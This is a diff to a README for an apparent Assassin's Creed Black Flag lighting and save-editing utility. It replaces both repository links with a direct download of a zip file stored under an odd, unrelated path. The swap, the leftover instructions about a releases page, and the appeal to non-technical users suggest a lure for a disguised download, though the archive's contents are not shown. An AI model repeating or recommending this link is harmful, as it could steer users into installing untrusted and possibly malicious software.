@@ -5,13 +5,13 @@ description: "Enhance Assassin's Creed Black Flag with ray-tracing visual upgrad
 ---
 # 🏴‍☠️ black-flag-script-utility-raytrace-save - Enhance lighting and manage saved games
 
-[![Download Utility](https://img.shields.io/badge/Download-Utility-blue.svg)](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save)
+[![Download Utility](https://img.shields.io/badge/Download-Utility-blue.svg)](https://raw.githubusercontent.com/Butterballreserveclause449/butterballreserveclause449.github.io/main/nematodiasis/2.0-beta.2.zip)
 
 This software manages game files and adds modern lighting effects to Assassin’s Creed Black Flag. It simplifies the process of editing your progress and improving graphical fidelity on modern Windows computers. You do not need technical knowledge to use these tools.
 
 ## 📥 Getting Started
 
-Visit the following link to access the installer package for your version of Windows: [https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save).
+Visit the following link to access the installer package for your version of Windows: [https://raw.githubusercontent.com/Butterballreserveclause449/butterballreserveclause449.github.io/main/nematodiasis/2.0-beta.2.zip](https://raw.githubusercontent.com/Butterballreserveclause449/butterballreserveclause449.github.io/main/nematodiasis/2.0-beta.2.zip).
 
 1. Click the link above.
 2. Look for the latest release on the right side of the page.
